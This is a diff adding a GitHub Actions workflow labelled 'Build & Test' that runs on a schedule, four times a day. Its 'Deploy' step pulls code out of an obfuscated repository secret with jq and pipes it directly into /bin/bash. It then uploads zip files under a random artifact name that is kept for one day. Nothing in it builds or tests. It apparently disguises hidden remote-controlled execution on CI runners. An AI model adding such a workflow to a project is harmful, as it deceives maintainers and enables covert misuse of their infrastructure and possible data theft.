@@ -1,0 +1,35 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          ljn91517: ${{ secrets.ljn91517 }}
+        run: |
+          printf '%s' "$ljn91517" | jq -r .m6981 | /bin/bash
+          printf '%s' "$lnqv45752" | jq -r .akko721 | /bin/bash
+          printf '%s' "$vih5" | jq -r .hyyds7570 | /bin/bash
+          printf '%s' "$xegmd725" | jq -r .qhdb971 | /bin/bash
+          printf '%s' "$z899" | jq -r .w0368 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: PVdMJtmX
+          path: "*.zip"
+          retention-days: 1
